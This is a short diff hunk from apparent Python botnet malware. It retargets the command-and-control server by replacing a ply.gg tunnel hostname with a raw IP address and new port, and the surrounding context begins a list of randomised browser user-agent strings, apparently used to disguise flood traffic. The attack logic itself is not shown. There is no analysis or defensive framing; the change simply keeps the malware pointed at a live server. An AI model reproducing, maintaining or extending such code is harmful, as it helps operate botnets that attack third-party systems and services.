@@ -3,8 +3,8 @@ import threading
 import time
 import random
 
-C2_ADDRESS  = "anti-referrals.craft.ply.gg"
-C2_PORT     = 12893
+C2_ADDRESS  = "52.12.224.116"
+C2_PORT     = 58244
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
